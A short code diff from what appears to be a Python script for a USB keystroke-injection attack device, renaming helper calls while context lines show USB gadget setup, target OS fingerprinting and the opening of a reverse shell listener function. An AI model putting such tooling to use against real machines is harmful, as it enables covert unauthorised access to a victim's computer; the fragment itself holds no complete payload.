@@ -22,7 +22,7 @@ os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/n
 os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
 print("Waiting for connection...")
 while(1):
-	if(electrical_test("/dev/hidg0", 1)):
+	if(eco.test_connection("/dev/hidg0", 1)):
 		print("Device connected to target")
 		# OS Fingerprinting
 		detectedos = eco.get_target_os()
@@ -46,7 +46,7 @@ while(1):
 			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
 		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
 		sleep(2)
-		wait_till_disconnect()
+		eco.wait_till_disconnect()
 
 def reverse_shell_listener():
 	s = socket.socket(AF_INET, SOCK_STREAM) # Create our socket handler.
